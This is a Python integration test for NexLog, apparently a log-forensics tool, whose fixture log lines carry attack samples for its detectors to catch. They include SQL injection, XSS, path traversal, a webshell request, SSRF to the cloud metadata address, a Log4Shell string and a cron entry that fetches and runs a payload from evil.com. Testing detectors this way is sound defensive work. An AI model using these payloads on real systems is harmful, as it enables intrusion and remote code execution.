"""
tests/integration/test_full_pipeline.py â€” NexLog
End-to-end integration test: main.py â†’ Layer1 â†’ Layer2 â†’ Layer3.
Creates real temp log files, runs main.analyse(), verifies all outputs.
Run: python test_full_pipeline.py
"""

import json
import os
import sys
import tempfile
from pathlib import Path

# â”€â”€ Self-locating path â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

_root = os.path.dirname(os.path.abspath(__file__))
for _ in range(8):
    if os.path.isfile(os.path.join(_root, 'pathconfig.py')):
        break
    _root = os.path.dirname(_root)
if _root not in sys.path:
    sys.path.insert(0, _root)
from pathconfig import ROOT, add_root
add_root()
_ROOT = ROOT
for _p in ['core','detection','storage','intelligence','output','utils']:
    sys.path.insert(0, os.path.join(_ROOT, _p))

# Import main module
sys.path.insert(0, _ROOT)
import main as fa_main

from finding import Severity
from case_db import CaseDB

# â”€â”€ Test helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_passed = _failed = 0

def check(name: str, cond: bool, detail: str = "") -> None:
    global _passed, _failed
    if cond:
        _passed += 1; print(f"  PASS  {name}")
    else:
        _failed += 1; print(f"  FAIL  {name}" + (f"  [{detail}]" if detail else ""))


# â”€â”€ Realistic log samples â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_APACHE_LINES = [
    # Clean traffic
    '10.0.0.1 - - [04/Jan/2026:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"',
    # SQLi with attack tool UA
    '203.0.113.5 - - [04/Jan/2026:10:00:01 +0000] "GET /login.php?user=admin\'%20OR%201=1-- HTTP/1.1" 200 512 "-" "sqlmap/1.7"',
    # XSS
    '1.1.1.1 - - [04/Jan/2026:10:00:02 +0000] "GET /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1" 200 256 "-" "curl/7.0"',
    # Log4Shell in UA
    '185.220.100.5 - - [04/Jan/2026:10:00:03 +0000] "GET / HTTP/1.1" 200 100 "-" "${jndi:ldap://evil.com:1389/x}"',
    # Path traversal
    '5.5.5.5 - - [04/Jan/2026:10:00:04 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
    # Directory brute-force (20 404s needed for RECON-002 threshold)
    *[f'9.9.9.9 - - [04/Jan/2026:10:00:{5+i:02d} +0000] "GET /admin{i} HTTP/1.1" 404 0 "-" "gobuster/3.0"'
      for i in range(25)],
    # Webshell access
    '203.0.113.6 - - [04/Jan/2026:10:01:00 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 48 "-" "curl/7.0"',
    # SSRF
    '7.7.7.7 - - [04/Jan/2026:10:01:01 +0000] "GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 512 "-" "python-requests/2.28"',
]

_SYSLOG_LINES = [
    # SSH brute force (5+ needed for AUTH-001)
    *[f'Jan  4 10:02:{i:02d} bastion sshd[1234]: Failed password for root from 10.0.0.50 port 54321 ssh2'
      for i in range(7)],
    # SSH success after failures (AUTH-002 sequence)
    'Jan  4 10:02:10 bastion sshd[1234]: Accepted password for root from 10.0.0.50 port 54321 ssh2',
    # Cron backdoor
    'Jan  4 10:03:00 server cron[5678]: crontab for root: */5 * * * * wget http://evil.com/payload -O /tmp/x && bash /tmp/x',
]


def _write_temp_log(lines: list, suffix: str = ".log") -> Path:
    f = tempfile.NamedTemporaryFile(
        mode="w", suffix=suffix, delete=False, encoding="utf-8"
    )
    f.write("\n".join(lines) + "\n")
    f.close()
    return Path(f.name)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST 1 â€” Apache log: detection correctness
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_apache_detection():
    print("\nâ”€â”€ 1. Apache log detection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    log  = _write_temp_log(_APACHE_LINES)
    case = Path(tempfile.mktemp(suffix=".facase"))
    rules_dir = Path(_ROOT) / "detection" / "rules"

    try:
        result = fa_main.analyse(
            log_paths=[log], case_path=case,
            rules_dir=rules_dir, min_severity="LOW",
            quiet=True,
        )
        findings = result["findings"]
        ids = {f.rule_id for f in findings}

        check("findings produced",          len(findings) > 0,
              f"got {len(findings)}")
        check("WEB-001 SQLi detected",      "WEB-001" in ids, f"ids={ids}")
        check("WEB-002 XSS detected",       "WEB-002" in ids, f"ids={ids}")
        check("WEB-003 traversal detected", "WEB-003" in ids, f"ids={ids}")
        check("WEB-008 webshell detected",  "WEB-008" in ids, f"ids={ids}")
        check("WEB-007 SSRF detected",      "WEB-007" in ids, f"ids={ids}")
        check("DISC-008 Log4Shell",         "DISC-008" in ids, f"ids={ids}")
        check("RECON-002 dir enum",         "RECON-002" in ids, f"ids={ids}")

        # Verify Layer 2 fields on findings
        sqli = next((f for f in findings if f.rule_id == "WEB-001"), None)
        if sqli:
            check("source_ip populated",    sqli.source_ip == "203.0.113.5")
            check("risk_score > 0",         sqli.risk_score > 0)
            check("confidence in [0,1]",    0 < sqli.confidence <= 1.0)
            check("to_dict serialisable",   bool(json.dumps(sqli.to_dict())))

        # Verify case DB
        with CaseDB(case) as db:
            stored = db.get_findings()
            check("findings stored in DB",   len(stored) > 0)
            s = db.get_findings_summary()
            check("summary total > 0",       s["total"] > 0)
            check("summary has severity",    len(s["by_severity"]) > 0)
    finally:
        log.unlink(missing_ok=True)
        case.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST 2 â€” Syslog: auth sequences + persistence
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_syslog_detection():
    print("\nâ”€â”€ 2. Syslog detection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    log  = _write_temp_log(_SYSLOG_LINES)
    case = Path(tempfile.mktemp(suffix=".facase"))
    rules_dir = Path(_ROOT) / "detection" / "rules"

    try:
        result = fa_main.analyse(
            log_paths=[log], case_path=case,
            rules_dir=rules_dir, min_severity="LOW",
            quiet=True,
        )
        findings = result["findings"]
        ids = {f.rule_id for f in findings}

        check("findings from syslog",       len(findings) > 0)
        check("AUTH-001 SSH brute force",   "AUTH-001" in ids, f"ids={ids}")
        check("PERS-006 cron backdoor",     "PERS-006" in ids, f"ids={ids}")

        # hostname and process_name populated from syslog parser
        auth_f = next((f for f in findings if f.rule_id == "AUTH-001"), None)
        if auth_f:
            check("hostname from syslog",   auth_f.hostname is not None,
                  f"got {auth_f.hostname}")
            check("process_name from syslog", auth_f.process_name is not None,
                  f"got {auth_f.process_name}")
    finally:
        log.unlink(missing_ok=True)
        case.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST 3 â€” Multi-file analysis + attack chains
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_multi_file_and_chains():
    print("\nâ”€â”€ 3. Multi-file + attack chains â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    apache_log = _write_temp_log(_APACHE_LINES)
    syslog_log = _write_temp_log(_SYSLOG_LINES)
    case       = Path(tempfile.mktemp(suffix=".facase"))
    rules_dir  = Path(_ROOT) / "detection" / "rules"

    try:
        result = fa_main.analyse(
            log_paths=[apache_log, syslog_log],
            case_path=case, rules_dir=rules_dir,
            min_severity="LOW", quiet=True,
        )
        check("multi-file findings > 0",   result["total_findings"] > 0)
        check("two session_ids",           len(result["session_ids"]) == 2)

        with CaseDB(case) as db:
            sessions = db.list_sessions()
            check("two sessions in DB",    len(sessions) == 2)
            all_f = db.get_findings()
            check("findings from both",    len(all_f) > 0)
            evidence = db.get_evidence()
            check("two evidence records",  len(evidence) == 2)
            chains = db.get_attack_chains()
            check("chains list exists",    isinstance(chains, list))
    finally:
        apache_log.unlink(missing_ok=True)
        syslog_log.unlink(missing_ok=True)
        case.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST 4 â€” Severity filter
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_severity_filter():
    print("\nâ”€â”€ 4. Severity filter â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    log  = _write_temp_log(_APACHE_LINES)
    case = Path(tempfile.mktemp(suffix=".facase"))
    rules_dir = Path(_ROOT) / "detection" / "rules"

    try:
        result_all  = fa_main.analyse([log], case, rules_dir,
                                      min_severity="LOW",  quiet=True)
        case.unlink(); case = Path(tempfile.mktemp(suffix=".facase"))
        result_crit = fa_main.analyse([log], case, rules_dir,
                                      min_severity="CRITICAL", quiet=True)

        check("LOW gets more findings",
              result_all["total_findings"] >= result_crit["total_findings"])
        check("CRITICAL filter applied",
              all(f.severity >= Severity.CRITICAL
                  for f in result_crit["findings"]),
              f"sev={[f.severity.value for f in result_crit['findings']]}")
    finally:
        log.unlink(missing_ok=True)
        case.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST 5 â€” Layer 3 outputs: IOC extraction + reports
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_layer3_outputs():
    print("\nâ”€â”€ 5. Layer 3 outputs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    log  = _write_temp_log(_APACHE_LINES)
    case = Path(tempfile.mktemp(suffix=".facase"))
    rules_dir = Path(_ROOT) / "detection" / "rules"

    with tempfile.TemporaryDirectory() as out_dir:
        out = Path(out_dir)
        try:
            result = fa_main.analyse([log], case, rules_dir,
                                     min_severity="LOW", quiet=True)

            ioc_csv   = out / "iocs.csv"
            stix_file = out / "iocs_stix.json"

            fa_main.write_outputs(
                case_path = case,
                report_fmt = "all",
                out_dir    = out,
                ioc_csv    = ioc_csv,
                stix_file  = stix_file,
                quiet      = True,
            )

            # Reports
            check("JSON report written",
                  (out / f"{case.stem}_report.json").exists())
            check("Text report written",
                  (out / f"{case.stem}_report.txt").exists())
            check("Markdown report written",
                  (out / f"{case.stem}_report.md").exists())

            # JSON report content
            jr = json.loads((out / f"{case.stem}_report.json").read_text(encoding="utf-8"))
            es = jr["executive_summary"]
            check("report total_findings > 0",    es["total_findings"] > 0)
            check("report has attacker_ips",       "attacker_ips" in es)
            check("report has affected_hosts",     "affected_hosts" in es)
            check("report has max_risk_score",     "max_risk_score" in es)
            check("timeline has hostname field",
                  all("hostname" in e for e in jr["timeline"]))
            check("timeline has risk_score field",
                  all("risk_score" in e for e in jr["timeline"]))

            # IOC CSV
            check("IOC CSV written",        ioc_csv.exists())
            csv_text = ioc_csv.read_text(encoding="utf-8")
            check("CSV has type header",    "type" in csv_text)
            check("CSV has rows",           csv_text.count("\n") >= 2)

            # STIX bundle
            check("STIX written",           stix_file.exists())
            bundle = json.loads(stix_file.read_text(encoding="utf-8"))
            check("STIX is bundle",         bundle["type"] == "bundle")
            check("STIX spec 2.1",          bundle["spec_version"] == "2.1")
            indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
            check("STIX has indicators",    len(indicators) > 0)
        finally:
            log.unlink(missing_ok=True)
            case.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST 6 â€” Chain of custody: SHA-256 hash written and verifiable
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_chain_of_custody():
    print("\nâ”€â”€ 6. Chain of custody â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    log  = _write_temp_log(_APACHE_LINES)
    case = Path(tempfile.mktemp(suffix=".facase"))
    rules_dir = Path(_ROOT) / "detection" / "rules"

    try:
        fa_main.analyse([log], case, rules_dir,
                        min_severity="LOW", quiet=True)

        with CaseDB(case) as db:
            evidence = db.get_evidence()
            check("evidence record exists",     len(evidence) == 1)
            check("SHA-256 stored",             len(evidence[0]["sha256"]) == 64)
            check("file_path stored",           str(log) in evidence[0]["file_path"])

            # Verify the hash
            eid    = evidence[0]["id"]
            result = db.verify_evidence(eid)
            check("verify_evidence passes",     result["verified"] is True)
            check("hashes match",
                  result["stored_hash"] == result["current_hash"])

            # Sessions store sha256 too
            sessions = db.list_sessions()
            check("session sha256 stored",      len(sessions[0]["sha256"]) == 64)
    finally:
        log.unlink(missing_ok=True)
        case.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST 7 â€” main() CLI argument parsing
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_cli_argument_parsing():
    print("\nâ”€â”€ 7. CLI argument parsing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    log  = _write_temp_log(_APACHE_LINES)
    case = Path(tempfile.mktemp(suffix=".facase"))
    rules_dir = Path(_ROOT) / "detection" / "rules"

    with tempfile.TemporaryDirectory() as out_dir:
        try:
            ioc_path  = str(Path(out_dir) / "iocs.csv")
            stix_path = str(Path(out_dir) / "stix.json")
            rc = fa_main.main([
                str(log),
                "--case",     str(case),
                "--rules",    str(rules_dir),
                "--severity", "LOW",
                "--report",   "json",
                "--out",      out_dir,
                "--ioc",      ioc_path,
                "--stix",     stix_path,
                "--analyst",  "test-analyst",
                "--quiet",
            ])
            check("main() returns 0",          rc == 0, f"got {rc}")
            check("case file created",         case.exists())
            check("IOC CSV created via CLI",   Path(ioc_path).exists())
            check("STIX created via CLI",      Path(stix_path).exists())

            with CaseDB(case) as db:
                check("analyst meta stored",
                      db.get_meta("analyst") == "test-analyst")
        finally:
            log.unlink(missing_ok=True)
            case.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TEST 8 â€” Deduplication: burst findings collapsed
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_deduplication():
    print("\nâ”€â”€ 8. Finding deduplication â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    # 30 lines from same IP hitting gobuster â€” should fire threshold once
    # then be deduplicated in save_findings
    lines = [
        f'9.9.9.9 - - [04/Jan/2026:10:00:{i:02d} +0000] '
        f'"GET /path{i} HTTP/1.1" 404 0 "-" "gobuster/3.0"'
        for i in range(30)
    ]
    log  = _write_temp_log(lines)
    case = Path(tempfile.mktemp(suffix=".facase"))
    rules_dir = Path(_ROOT) / "detection" / "rules"

    try:
        result = fa_main.analyse([log], case, rules_dir,
                                 min_severity="LOW", quiet=True)
        with CaseDB(case) as db:
            stored = db.get_findings()
            # Threshold fires once per reset â€” dedup should keep it clean
            recon_f = [f for f in stored if f.rule_id == "RECON-002"]
            check("RECON-002 detected",        len(recon_f) >= 1)
            check("dedup: not one per line",   len(recon_f) < 30,
                  f"got {len(recon_f)}")
    finally:
        log.unlink(missing_ok=True)
        case.unlink(missing_ok=True)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# main
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
if __name__ == "__main__":
    print("=" * 60)
    print("  NexLog â€” End-to-End Integration Tests")
    print("=" * 60)

    test_apache_detection()
    test_syslog_detection()
    test_multi_file_and_chains()
    test_severity_filter()
    test_layer3_outputs()
    test_chain_of_custody()
    test_cli_argument_parsing()
    test_deduplication()

    print(f"\n{'=' * 60}")
    print(f"  Results:  {_passed} passed Â· {_failed} failed")
    print(f"{'=' * 60}")
    if _failed:
        raise SystemExit(1)
